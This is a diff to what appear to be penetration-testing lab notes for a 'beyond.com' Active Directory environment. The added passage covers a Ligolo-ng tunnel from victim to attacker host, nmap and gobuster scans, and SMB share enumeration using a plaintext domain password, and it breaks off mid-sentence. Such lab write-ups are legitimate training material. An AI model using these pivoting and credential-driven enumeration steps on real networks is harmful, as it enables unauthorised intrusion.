@@ -1274,7 +1274,6 @@ Three active sessions are shown:
 	- BloodHound uses this representation of a principal when the domain identifier of the SID is from a local machine.
 	  For this session, this means that the local _Administrator_ (indicated by RID 500) has an active session on INTERNALSRV1.
 
-
 ##### Kerberoastables
 
 List all Kerberoastable accounts:
@@ -1292,4 +1291,183 @@ Based on the `http`, we can assume there's a web server running on this endpoint
 > Again, even though we have a potential vector for attack, we should still enumerated and collect all info prior to attacking.
 
 
-In order to enumerate the internal network, we'll need to set up a SOCKS proxy
+In order to enumerate the internal network, we'll need to set up a SOCKS proxy OR ligolo
+
+#### Ligolo-ng Tunneling
+
+- On Kali - Setup Ligolo proxy
+```bash
+sudo .\proxy -selfcert -laddr 192.168.45.170:443
+```
+
+- On Vic - Connect
+```powershell
+.\agent.exe -connect 192.168.45.170:443 -ignore-cert
+```
+
+- On Kali - Finish setup
+```bash
+# In logolo, once connected
+session
+	# Pick session (or Enter for default)
+
+# In new tab, add route
+ip route add 172.16.155.0/24 dev ligolo
+ip route list
+	# Should see `172.16.155.0/24 dev ligolo scope link linkdown`
+
+# In logolo, start tunnel
+start
+```
+
+- Use IPs discovered in `comps.txt` to check for popular ports
+```bash
+sudo nmap -v --top-ports=20 172.16.155.240-243 -oN 172.16-top_ports.txt
+	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-20 15:27 EDT
+	...
+	Nmap scan report for 172.16.155.240      # NOTE -> DCSRV1
+	PORT     STATE    SERVICE
+	21/tcp   filtered ftp
+	22/tcp   filtered ssh
+	23/tcp   filtered telnet
+	25/tcp   filtered smtp
+	53/tcp   open     domain
+	80/tcp   filtered http
+	110/tcp  filtered pop3
+	111/tcp  filtered rpcbind
+	135/tcp  open     msrpc
+	139/tcp  open     netbios-ssn
+	143/tcp  filtered imap
+	443/tcp  filtered https
+	445/tcp  open     microsoft-ds
+	993/tcp  filtered imaps
+	995/tcp  filtered pop3s
+	1723/tcp filtered pptp
+	3306/tcp filtered mysql
+	3389/tcp filtered ms-wbt-server
+	5900/tcp filtered vnc
+	8080/tcp filtered http-proxy
+	
+	Nmap scan report for 172.16.155.241      # NOTE -> INTERNALSRV1
+	PORT     STATE    SERVICE
+	21/tcp   filtered ftp
+	22/tcp   filtered ssh
+	23/tcp   filtered telnet
+	25/tcp   filtered smtp
+	53/tcp   filtered domain
+	80/tcp   open     http
+	110/tcp  filtered pop3
+	111/tcp  filtered rpcbind
+	135/tcp  open     msrpc
+	139/tcp  open     netbios-ssn
+	143/tcp  filtered imap
+	443/tcp  open     https
+	445/tcp  open     microsoft-ds
+	993/tcp  filtered imaps
+	995/tcp  filtered pop3s
+	1723/tcp filtered pptp
+	3306/tcp open     mysql
+	3389/tcp filtered ms-wbt-server
+	5900/tcp filtered vnc
+	8080/tcp filtered http-proxy
+	
+	Nmap scan report for 172.16.155.242
+	...
+	
+	Nmap scan report for 172.16.155.243      # NOTE -> CLIENTWK1
+	PORT     STATE    SERVICE
+	21/tcp   filtered ftp
+	22/tcp   filtered ssh
+	23/tcp   filtered telnet
+	25/tcp   filtered smtp
+	53/tcp   filtered domain
+	80/tcp   filtered http
+	110/tcp  filtered pop3
+	111/tcp  filtered rpcbind
+	135/tcp  open     msrpc
+	139/tcp  open     netbios-ssn
+	143/tcp  filtered imap
+	443/tcp  filtered https
+	445/tcp  open     microsoft-ds
+	993/tcp  filtered imaps
+	995/tcp  filtered pop3s
+	1723/tcp filtered pptp
+	3306/tcp filtered mysql
+	3389/tcp filtered ms-wbt-server
+	5900/tcp filtered vnc
+	8080/tcp filtered http-proxy
+```
+
+- Enumerate SMB shares
+```bash
+nxc smb 172.16.155.240-241 172.16.155.243 -u john -p dqsTwTpZPn#nL -d beyond.com --shares
+	SMB         172.16.155.243  445    CLIENTWK1        [*] Windows 11 Build 22000 x64 (name:CLIENTWK1) (domain:beyond.com) (signing:False) (SMBv1:False)
+	SMB         172.16.155.240  445    DCSRV1           [*] Windows Server 2022 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
+	SMB         172.16.155.241  445    INTERNALSRV1     [*] Windows Server 2022 Build 20348 x64 (name:INTERNALSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
+	SMB         172.16.155.243  445    CLIENTWK1        [+] beyond.com\john:dqsTwTpZPn#nL 
+	SMB         172.16.155.240  445    DCSRV1           [+] beyond.com\john:dqsTwTpZPn#nL 
+	SMB         172.16.155.243  445    CLIENTWK1        [*] Enumerated shares
+	SMB         172.16.155.243  445    CLIENTWK1        Share           Permissions     Remark
+	SMB         172.16.155.243  445    CLIENTWK1        -----           -----------     ------
+	SMB         172.16.155.243  445    CLIENTWK1        ADMIN$                          Remote Admin
+	SMB         172.16.155.243  445    CLIENTWK1        C$                              Default share
+	SMB         172.16.155.243  445    CLIENTWK1        IPC$            READ            Remote IPC
+	SMB         172.16.155.241  445    INTERNALSRV1     [+] beyond.com\john:dqsTwTpZPn#nL 
+	SMB         172.16.155.241  445    INTERNALSRV1     [*] Enumerated shares
+	SMB         172.16.155.241  445    INTERNALSRV1     Share           Permissions     Remark
+	SMB         172.16.155.241  445    INTERNALSRV1     -----           -----------     ------
+	SMB         172.16.155.241  445    INTERNALSRV1     ADMIN$                          Remote Admin
+	SMB         172.16.155.241  445    INTERNALSRV1     C$                              Default share
+	SMB         172.16.155.241  445    INTERNALSRV1     IPC$            READ            Remote IPC
+	SMB         172.16.155.240  445    DCSRV1           [*] Enumerated shares
+	SMB         172.16.155.240  445    DCSRV1           Share           Permissions     Remark
+	SMB         172.16.155.240  445    DCSRV1           -----           -----------     ------
+	SMB         172.16.155.240  445    DCSRV1           ADMIN$                          Remote Admin
+	SMB         172.16.155.240  445    DCSRV1           C$                              Default share
+	SMB         172.16.155.240  445    DCSRV1           IPC$            READ            Remote IPC
+	SMB         172.16.155.240  445    DCSRV1           NETLOGON        READ            Logon server share 
+	SMB         172.16.155.240  445    DCSRV1           SYSVOL          READ            Logon server share 
+	Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+```
+
+- Take a look into INTERNALSRV1's website
+```bash
+gobuster dir -u http://172.16.155.241 -w /usr/share/wordlists/dirb/common.txt -o internalsrv/gobuster
+	===============================================================
+	Gobuster v3.6
+	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+	===============================================================
+	[+] Url:                     http://172.16.155.241
+	[+] Method:                  GET
+	[+] Threads:                 10
+	[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+	[+] Negative Status codes:   404
+	[+] User Agent:              gobuster/3.6
+	[+] Timeout:                 10s
+	===============================================================
+	Starting gobuster in directory enumeration mode
+	===============================================================
+	...
+	/dashboard            (Status: 301) [Size: 345] [--> http://172.16.155.241/dashboard/]
+	/favicon.ico          (Status: 200) [Size: 30894]
+	/examples             (Status: 503) [Size: 404]
+	/img                  (Status: 301) [Size: 339] [--> http://172.16.155.241/img/]
+	/index.php            (Status: 302) [Size: 0] [--> http://172.16.155.241/wordpress/]
+	...
+	/wordpress            (Status: 301) [Size: 345] [--> http://172.16.155.241/wordpress/]
+	Progress: 4614 / 4615 (99.98%)
+	===============================================================
+	Finished
+	===============================================================
+```
+
+- Add site to /etc/hosts
+```bash
+vim /etc/hosts
+	172.16.155.241   internalsrv1.beyond.com
+```
+
+- Goto `http://internalsrv1.beyond.com/wordpress/wp-admin`
+	- Will redirect you to a login page.
+
+- Sadly none of the 
